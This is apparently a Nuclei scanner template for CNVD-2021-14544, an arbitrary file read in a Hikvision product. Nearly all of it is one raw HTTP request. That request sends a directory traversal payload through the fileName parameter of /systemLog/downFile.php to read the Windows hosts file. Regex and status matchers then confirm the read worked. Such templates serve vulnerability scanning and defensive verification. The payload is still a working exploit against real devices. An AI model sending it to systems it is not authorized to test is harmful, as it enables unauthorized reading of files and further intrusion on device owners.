id: Hikvision 任意文件读取(CNVD-2021-14544)

info:
  name: Hikvision 任意文件读取(CNVD-2021-14544)
  author: wintry
  severity: critical
  tags: hikvision

http:
  - raw:
      - |
        GET /systemLog/downFile.php?fileName=../../../../../../windows/system32/drivers/etc/hosts HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6

    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - '127\.0\.0\.1\s*localhost'

      - type: status
        status:
          - 200

